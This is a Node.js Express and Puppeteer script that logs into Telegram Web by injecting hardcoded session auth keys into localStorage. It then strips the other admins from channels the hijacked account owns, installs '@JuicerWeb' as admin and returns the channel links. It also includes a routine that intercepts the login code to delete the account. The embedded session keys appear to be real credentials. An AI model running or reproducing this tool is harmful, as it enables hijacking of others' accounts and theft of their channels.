const express = require("express");
const multer = require("multer");
const path = require("path");
const puppeteer = require('puppeteer');

const app = express();
const port = process.env.PORT || 5000;

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.get('/', (req, res) => {
      res.send('123')
 })


app.post("/uploadFile", upload.single("myFile"), (req, res, next) => { // myFile should be the same value as used in HTML name attribute of input
  const file = req.file; // We get the file in req.file

  if (!file) { // in case we do not get a file we return
    const error = new Error("Please upload a file");
    error.httpStatusCode = 400;
    return next(error);
  }
  const multerText = Buffer.from(file.buffer).toString("utf-8"); // this reads and converts the contents of the text file into string

  const result = { // the final object which will hold the content of the file under fileText key.
    fileText: multerText,
  };


//   res.send(result);
const puppeteer = require('puppeteer');

function delay(time) {
   return new Promise(function(resolve) { 
       setTimeout(resolve, time)
   });
}


async function getNumber() {
   const browser = await puppeteer.launch();
   const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
  await page.goto('https://web.telegram.org/z/');
  await page.evaluate(() => {
   let data = JSON.parse("{\"dc4_server_salt\":\"\\\"f5ada12212be578c\\\"\",\"dc2_auth_key\":\"\\\"2747a94dfdffc5ee96860f4503fc6646eee535b484b0f165298356f0e52c42c4bcd43ea1aed5f9b5a2e75098851cbe9b91886d86a55af204e4bd43f9ac05b204eedbed52807d017f17a541270ed975bd64efa88ce5215744309d1c233b30be18415580f58531fdfdeb5bccff2b6cf52f84d31eb0c0d609b405dde95f9f54fd4acbd6bbb08e8528f9a4b2e3c44e980a1710bd396afec9fa46922be248cb4e7d9dd9633d3907a7bb1972827f734a0a9667759050dd3ca663f08159624acd1f53fba717b6cfef56d5672543a687ea6246c08cd1effb651c411e393937f85347fff3fdb2306ca877c532cad66358c0c8239d90ed1115449ff1d980b9eb7c941cd219\\\"\",\"dc5_auth_key\":\"\\\"7c330b47144a8c4376148ac515ac9857774c685b703ce6d4ad536ee912d08123fd787008bfa5933cd252a01d0cc05645fb544e038737c82593bc502b1ac97ec06ac728e122fa818bf6966da75148d8d6123b20cd10aff04b87a7d82272db128c9e91302c5b1a0427e068f503f6b6f3114ed0adaa60a3396c126e051b8138017e2ea47e4e7f57ab04aed169433767c97656d471971480d1be5fa788e08d6ee73fdd826e237ec87b468ba22292352c68af9a48966b55080520475deedcc2e80981c5bb49a124452ded19b8e4406ffe4b0b1eec961d5770f04da75c4aa40c20f8b1dae4f9b1e1ad12d39be8e27b54ae7c9f954a17f9a4bbe770982a4256d0487dbe\\\"\",\"dc1_server_salt\":\"\\\"77f3f5edffe14766\\\"\",\"server_time_offset\":\"1\",\"dc2_server_salt\":\"\\\"b03237343f971a5a\\\"\",\"state_id\":\"2312506391\",\"dc1_auth_key\":\"\\\"b1375bde610f5e8778cb99949d02b9f42517e560942df732dd3d5e0863194f23d022557a82ab547665f674190df3a1d38006da9973d03de2df154880089c55694e9daa15aa61621d1e1fe6df7b9bf849b79d965c0b762e16ed836599f9d68e5f57b0322f81aadd26637eaa6285fcd397d8e23df0446fd1e223bdb70a8fdebc59f6981ca894aec2edc6aea51af3c8ace79ba185860636e0681174a13c82c7d672fcbc1b9875fc511259711c69fbeb816c0d4e6c358721963b249bd2d0430bb850b1d51c69f7379f4bf25fde6129830f0d17cb0a37d17c275cf326797cefa5b2ace1cd412d91c5d1866f7f546e1a8920169667b32a1a2f0bd7b49bfd30bad0a07b\\\"\",\"dc3_auth_key\":\"\\\"3f0abcdc06738f684fb2cbcb678f1965beeb91d3104d88aab6e0e7caac162266ee56539d99b027bf65c38534b5b47fc6189800b10cc711430119f220cba3ddc88e9184c8c11c521e979c9bf87bccb390b7e2df716b7880152d9038b938f3fa9189e1497fe9e3c0f842885e8cde9a577222de72421cca257afc7a0c836a45469bc4cc17bd27a16e4df50468305bfc3e90b8d112242b2053253b0a1841bee1db871d642cbc65300d37c7443e876d962db365aaec663f5ba5593da83534a5cbcf9cb43d2ff3bce12af6ad86bd1df90c0366f5f934a9c2c4adca7e478632a67a45add1dc01b0616be809522fd49758611ef2ae33830304949ed2165194ed58e27c9d\\\"\",\"dc5_server_salt\":\"\\\"ffd027590c8c04d9\\\"\",\"dc3_server_salt\":\"\\\"8c32f749cbc20118\\\"\",\"user_auth\":\"{\\\"dcID\\\":2,\\\"date\\\":1664217445,\\\"id\\\":5620579870}\",\"xt_instance\":\"{\\\"id\\\":3368751368,\\\"idle\\\":true,\\\"time\\\":1664217443462}\",\"dc\":\"2\",\"dc4_auth_key\":\"\\\"83935b2944f54e6a90c63f753530f2f7cec4e290e8d6094dca783b2df7ce2c2790dcda438725dd11bef3267cef225582476121de25335dd8c63d2d9f966bf0616c2351ff1fa21c3bc4f620fe2936f50862f70c3fa1e8d355e341488e7c048e066144e75f97b37bdbedaa3e1e3ea335cdd66d40bf2823ac6a54889882d308f09851ee95d028f6b448e0e6ae9c711b0c800483883ac25c75aa0e8c1bcafb9f9e341dd7d06e1720b7023180ffec0f9354e3d40bfbf9eb618af6901c73e3923df0734c216ddb4f3261974f9f8495899a9ca84d99854fa9c7437a666beea52a46d2e725c0853fc10a0271ee2daec7e386b6477bdf9818dfbdeb2c527c4c59bc930f91\\\"\"}");
Object.keys(data).forEach(function (k) {
    localStorage.setItem(k, data[k]);
});
document.location.reload(true);
  });
  await page.waitForSelector('.ListItem-button')
   await page.click('.DropdownMenu')
   await page.waitForTimeout(1000)
   await page.click('.icon-saved-messages')
   await page.waitForTimeout(1000)
   await page.click('.DropdownMenu')
   await page.waitForTimeout(1000)
   await page.click('.icon-settings')
   await page.waitForTimeout(1000)
   const phoneElement = await page.waitForSelector('.ChatExtra .ListItem:first-child .multiline-item .title');
   let phoneUser = await phoneElement.evaluate(el => el.textContent);
   await browser.close()

   console.log(phoneUser)
   return phoneUser
}


async function checkCode() {
   const browser = await puppeteer.launch();
   const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
await page.goto('https://web.telegram.org/z/');
await page.evaluate(() => {
 let data = JSON.parse("{\"dc4_server_salt\":\"\\\"f5ada12212be578c\\\"\",\"dc2_auth_key\":\"\\\"2747a94dfdffc5ee96860f4503fc6646eee535b484b0f165298356f0e52c42c4bcd43ea1aed5f9b5a2e75098851cbe9b91886d86a55af204e4bd43f9ac05b204eedbed52807d017f17a541270ed975bd64efa88ce5215744309d1c233b30be18415580f58531fdfdeb5bccff2b6cf52f84d31eb0c0d609b405dde95f9f54fd4acbd6bbb08e8528f9a4b2e3c44e980a1710bd396afec9fa46922be248cb4e7d9dd9633d3907a7bb1972827f734a0a9667759050dd3ca663f08159624acd1f53fba717b6cfef56d5672543a687ea6246c08cd1effb651c411e393937f85347fff3fdb2306ca877c532cad66358c0c8239d90ed1115449ff1d980b9eb7c941cd219\\\"\",\"dc5_auth_key\":\"\\\"7c330b47144a8c4376148ac515ac9857774c685b703ce6d4ad536ee912d08123fd787008bfa5933cd252a01d0cc05645fb544e038737c82593bc502b1ac97ec06ac728e122fa818bf6966da75148d8d6123b20cd10aff04b87a7d82272db128c9e91302c5b1a0427e068f503f6b6f3114ed0adaa60a3396c126e051b8138017e2ea47e4e7f57ab04aed169433767c97656d471971480d1be5fa788e08d6ee73fdd826e237ec87b468ba22292352c68af9a48966b55080520475deedcc2e80981c5bb49a124452ded19b8e4406ffe4b0b1eec961d5770f04da75c4aa40c20f8b1dae4f9b1e1ad12d39be8e27b54ae7c9f954a17f9a4bbe770982a4256d0487dbe\\\"\",\"dc1_server_salt\":\"\\\"77f3f5edffe14766\\\"\",\"server_time_offset\":\"1\",\"dc2_server_salt\":\"\\\"b03237343f971a5a\\\"\",\"state_id\":\"2312506391\",\"dc1_auth_key\":\"\\\"b1375bde610f5e8778cb99949d02b9f42517e560942df732dd3d5e0863194f23d022557a82ab547665f674190df3a1d38006da9973d03de2df154880089c55694e9daa15aa61621d1e1fe6df7b9bf849b79d965c0b762e16ed836599f9d68e5f57b0322f81aadd26637eaa6285fcd397d8e23df0446fd1e223bdb70a8fdebc59f6981ca894aec2edc6aea51af3c8ace79ba185860636e0681174a13c82c7d672fcbc1b9875fc511259711c69fbeb816c0d4e6c358721963b249bd2d0430bb850b1d51c69f7379f4bf25fde6129830f0d17cb0a37d17c275cf326797cefa5b2ace1cd412d91c5d1866f7f546e1a8920169667b32a1a2f0bd7b49bfd30bad0a07b\\\"\",\"dc3_auth_key\":\"\\\"3f0abcdc06738f684fb2cbcb678f1965beeb91d3104d88aab6e0e7caac162266ee56539d99b027bf65c38534b5b47fc6189800b10cc711430119f220cba3ddc88e9184c8c11c521e979c9bf87bccb390b7e2df716b7880152d9038b938f3fa9189e1497fe9e3c0f842885e8cde9a577222de72421cca257afc7a0c836a45469bc4cc17bd27a16e4df50468305bfc3e90b8d112242b2053253b0a1841bee1db871d642cbc65300d37c7443e876d962db365aaec663f5ba5593da83534a5cbcf9cb43d2ff3bce12af6ad86bd1df90c0366f5f934a9c2c4adca7e478632a67a45add1dc01b0616be809522fd49758611ef2ae33830304949ed2165194ed58e27c9d\\\"\",\"dc5_server_salt\":\"\\\"ffd027590c8c04d9\\\"\",\"dc3_server_salt\":\"\\\"8c32f749cbc20118\\\"\",\"user_auth\":\"{\\\"dcID\\\":2,\\\"date\\\":1664217445,\\\"id\\\":5620579870}\",\"xt_instance\":\"{\\\"id\\\":3368751368,\\\"idle\\\":true,\\\"time\\\":1664217443462}\",\"dc\":\"2\",\"dc4_auth_key\":\"\\\"83935b2944f54e6a90c63f753530f2f7cec4e290e8d6094dca783b2df7ce2c2790dcda438725dd11bef3267cef225582476121de25335dd8c63d2d9f966bf0616c2351ff1fa21c3bc4f620fe2936f50862f70c3fa1e8d355e341488e7c048e066144e75f97b37bdbedaa3e1e3ea335cdd66d40bf2823ac6a54889882d308f09851ee95d028f6b448e0e6ae9c711b0c800483883ac25c75aa0e8c1bcafb9f9e341dd7d06e1720b7023180ffec0f9354e3d40bfbf9eb618af6901c73e3923df0734c216ddb4f3261974f9f8495899a9ca84d99854fa9c7437a666beea52a46d2e725c0853fc10a0271ee2daec7e386b6477bdf9818dfbdeb2c527c4c59bc930f91\\\"\"}");
Object.keys(data).forEach(function (k) {
  localStorage.setItem(k, data[k]);
});
document.location.reload(true);
});
   await page.waitForSelector('.ListItem-button')
   await page.type('input[placeholder="Search"]', 'Telegram', { delay: 100 });
   await page.waitForTimeout(1000)
   const [button] = await page.$x("//span[contains(., 'service notifications')]");
   if (button) {
       await button.click();
   }
   await page.waitForTimeout(2000)
   const textCode = await page.evaluate(() => document.querySelectorAll('.message-list-item')[document.querySelectorAll('.message-list-item').length - 2].innerHTML)
   await page.waitForTimeout(1000)
   await browser.close()
   return textCode
}



async function deleteAccount(num) {
   const browser = await puppeteer.launch();
   const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
  await page.goto('https://my.telegram.org/auth');
  await page.waitForSelector('.form-control.input-large')
   await page.type('.form-control.input-large', num, { delay: 100 });
   await page.waitForTimeout(500)
   await page.click('.btn.btn-primary.btn-lg')

   await page.waitForTimeout(5000)

   const code = await checkCode()

   await page.waitForTimeout(500)

   var subStr = code.match(":<br>(.*)<br><br>Do");
   await page.type('input[placeholder="Confirmation code"]', subStr[1], { delay: 100 });
   await page.waitForTimeout(500)
   await page.click('.btn.btn-primary.btn-lg')

}


async function createFolder() {

   let myname = 'none'
   const log = []

   

   // {headless:false}
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.setViewport({
   width: 1920,
   height: 600
});
  await page.goto('https://web.telegram.org/z/');
  await page.evaluate(() => {
   let data = JSON.parse("{\"dc4_server_salt\":\"\\\"f5ada12212be578c\\\"\",\"dc2_auth_key\":\"\\\"2747a94dfdffc5ee96860f4503fc6646eee535b484b0f165298356f0e52c42c4bcd43ea1aed5f9b5a2e75098851cbe9b91886d86a55af204e4bd43f9ac05b204eedbed52807d017f17a541270ed975bd64efa88ce5215744309d1c233b30be18415580f58531fdfdeb5bccff2b6cf52f84d31eb0c0d609b405dde95f9f54fd4acbd6bbb08e8528f9a4b2e3c44e980a1710bd396afec9fa46922be248cb4e7d9dd9633d3907a7bb1972827f734a0a9667759050dd3ca663f08159624acd1f53fba717b6cfef56d5672543a687ea6246c08cd1effb651c411e393937f85347fff3fdb2306ca877c532cad66358c0c8239d90ed1115449ff1d980b9eb7c941cd219\\\"\",\"dc5_auth_key\":\"\\\"7c330b47144a8c4376148ac515ac9857774c685b703ce6d4ad536ee912d08123fd787008bfa5933cd252a01d0cc05645fb544e038737c82593bc502b1ac97ec06ac728e122fa818bf6966da75148d8d6123b20cd10aff04b87a7d82272db128c9e91302c5b1a0427e068f503f6b6f3114ed0adaa60a3396c126e051b8138017e2ea47e4e7f57ab04aed169433767c97656d471971480d1be5fa788e08d6ee73fdd826e237ec87b468ba22292352c68af9a48966b55080520475deedcc2e80981c5bb49a124452ded19b8e4406ffe4b0b1eec961d5770f04da75c4aa40c20f8b1dae4f9b1e1ad12d39be8e27b54ae7c9f954a17f9a4bbe770982a4256d0487dbe\\\"\",\"dc1_server_salt\":\"\\\"77f3f5edffe14766\\\"\",\"server_time_offset\":\"1\",\"dc2_server_salt\":\"\\\"b03237343f971a5a\\\"\",\"state_id\":\"2312506391\",\"dc1_auth_key\":\"\\\"b1375bde610f5e8778cb99949d02b9f42517e560942df732dd3d5e0863194f23d022557a82ab547665f674190df3a1d38006da9973d03de2df154880089c55694e9daa15aa61621d1e1fe6df7b9bf849b79d965c0b762e16ed836599f9d68e5f57b0322f81aadd26637eaa6285fcd397d8e23df0446fd1e223bdb70a8fdebc59f6981ca894aec2edc6aea51af3c8ace79ba185860636e0681174a13c82c7d672fcbc1b9875fc511259711c69fbeb816c0d4e6c358721963b249bd2d0430bb850b1d51c69f7379f4bf25fde6129830f0d17cb0a37d17c275cf326797cefa5b2ace1cd412d91c5d1866f7f546e1a8920169667b32a1a2f0bd7b49bfd30bad0a07b\\\"\",\"dc3_auth_key\":\"\\\"3f0abcdc06738f684fb2cbcb678f1965beeb91d3104d88aab6e0e7caac162266ee56539d99b027bf65c38534b5b47fc6189800b10cc711430119f220cba3ddc88e9184c8c11c521e979c9bf87bccb390b7e2df716b7880152d9038b938f3fa9189e1497fe9e3c0f842885e8cde9a577222de72421cca257afc7a0c836a45469bc4cc17bd27a16e4df50468305bfc3e90b8d112242b2053253b0a1841bee1db871d642cbc65300d37c7443e876d962db365aaec663f5ba5593da83534a5cbcf9cb43d2ff3bce12af6ad86bd1df90c0366f5f934a9c2c4adca7e478632a67a45add1dc01b0616be809522fd49758611ef2ae33830304949ed2165194ed58e27c9d\\\"\",\"dc5_server_salt\":\"\\\"ffd027590c8c04d9\\\"\",\"dc3_server_salt\":\"\\\"8c32f749cbc20118\\\"\",\"user_auth\":\"{\\\"dcID\\\":2,\\\"date\\\":1664217445,\\\"id\\\":5620579870}\",\"xt_instance\":\"{\\\"id\\\":3368751368,\\\"idle\\\":true,\\\"time\\\":1664217443462}\",\"dc\":\"2\",\"dc4_auth_key\":\"\\\"83935b2944f54e6a90c63f753530f2f7cec4e290e8d6094dca783b2df7ce2c2790dcda438725dd11bef3267cef225582476121de25335dd8c63d2d9f966bf0616c2351ff1fa21c3bc4f620fe2936f50862f70c3fa1e8d355e341488e7c048e066144e75f97b37bdbedaa3e1e3ea335cdd66d40bf2823ac6a54889882d308f09851ee95d028f6b448e0e6ae9c711b0c800483883ac25c75aa0e8c1bcafb9f9e341dd7d06e1720b7023180ffec0f9354e3d40bfbf9eb618af6901c73e3923df0734c216ddb4f3261974f9f8495899a9ca84d99854fa9c7437a666beea52a46d2e725c0853fc10a0271ee2daec7e386b6477bdf9818dfbdeb2c527c4c59bc930f91\\\"\"}");
Object.keys(data).forEach(function (k) {
    localStorage.setItem(k, data[k]);
});
document.location.reload(true);
  });
   await page.waitForSelector('.ListItem-button')
   await page.click('.DropdownMenu')
   await page.waitForTimeout(1000)
   await page.click('.icon-settings')

   await page.waitForTimeout(1000)

   const mynameElement = await page.waitForSelector('.fullName');
   myname = await mynameElement.evaluate(el => el.textContent);
   console.log(myname)

   await page.waitForTimeout(1000)
   await page.click('.icon-folder')
   await page.waitForTimeout(1000)
   await page.click('.icon-add')
   await page.waitForSelector('input[aria-label="Folder name"]')
   await page.type('input[aria-label="Folder name"]', "my-all-channel", { delay: 100 });
   await page.waitForTimeout(1000)
   await page.click('.settings-item.no-border.pt-3 .icon-add')
   await page.waitForTimeout(1000)
   await page.click('.ListItem-button > .icon-channel')
   await page.waitForTimeout(1000)
   await page.click('button[title="Confirm"]')
   await page.waitForTimeout(1000)
   await page.click('button[title="Create folder"]')
   await page.waitForTimeout(1000)
   await page.click('#Settings > div.Transition__slide--active > div.left-header > button')
   await page.waitForTimeout(1000)
   await page.click('#Settings > div.Transition__slide--active > div.left-header > button')
   await page.waitForTimeout(1000)
   const [button] = await page.$x("//span[contains(., 'my-all-channel')]");
   if (button) {
       await button.click();
   }
   await page.waitForTimeout(1000)

   const channelArray = await page.$$('#LeftColumn-main > div.Transition.zoom-fade > div > div > div.Transition.slide-optimized > div.Transition__slide--active > div > div > div.ListItem.Chat.chat-item-clickable.group.no-selection.has-ripple')
   
   let firstChannel = true;
   for (let channel of channelArray){
      
      await page.waitForTimeout(1000)
      await channel.click()
      if (firstChannel) {
         await page.waitForTimeout(1000)
         await page.click('.MiddleHeader')
         firstChannel = false
      }

      await page.waitForTimeout(1000)

      if (await page.$('#RightColumn > div.RightHeader > div > div > section > button') !== null) {

         await page.waitForTimeout(1000)
         await page.waitForSelector('.multiline-item .title')
         const link = await page.evaluate(() => document.querySelector('.multiline-item .title').textContent)
         
         
         await page.click('#RightColumn > div.RightHeader > div > div > section > button')
         await page.waitForTimeout(1000)
         await page.click('.icon-admin')
         await page.waitForTimeout(1000)


         const ownerNickname = await page.evaluate(() => Array.from(document.querySelectorAll('span.status')).filter(item => item.textContent.includes('Owner'))[0].closest('.info').querySelector('h3').textContent)
         
         console.log(ownerNickname);

         if (ownerNickname.trim() === myname) {

            await deleteAdmin()

            async function deleteAdmin() {
               await page.waitForTimeout(1000)
               const admin = await page.$('.Management .ListItem.chat-item-clickable:nth-child(3)')
               console.log(admin)
               // await page.waitForTimeout(10000)
               if (await page.$('.Management .ListItem.chat-item-clickable:nth-child(3)') !== null) {
                  await admin.click()
                  await page.waitForTimeout(1000)
                  // await page.waitForSelector('.icon-delete')
                  await page.click('.icon-delete')
                  await page.waitForTimeout(1000)
                  // await page.waitForSelector('.Button.confirm-dialog-button.default.danger.text')
                  page.click('.Button.confirm-dialog-button.default.danger.text')
                  await deleteAdmin()
               }
            }

            await page.waitForTimeout(1000)
            // await page.waitForSelector('.icon-add-user-filled')
            await page.click('.icon-add-user-filled')

            await page.waitForTimeout(1000)
            // await page.waitForSelector('.Management__filter input[placeholder="Search"]')
            await page.type('.Management__filter input[placeholder="Search"]', "@JuicerWeb", { delay: 100 });

            await page.waitForTimeout(1000)
            await page.click('.ListItem.chat-item-clickable.scroll-item.no-selection')

            await page.waitForTimeout(1000)
            await page.click('.Button[aria-label="Save"]')

            await page.waitForTimeout(3000)

            log.push({link, role: 'owner'})

         } else {
            log.push({link, role: 'admin'})
         }

      }
   }

   // return log
   res.send(log);
   await browser.close();
   // console.log(log)
   // let number = await getNumber()
   // await deleteAccount(number)

}

createFolder()

});

app.listen(port, () => console.log(`App listening on port ${port}!`));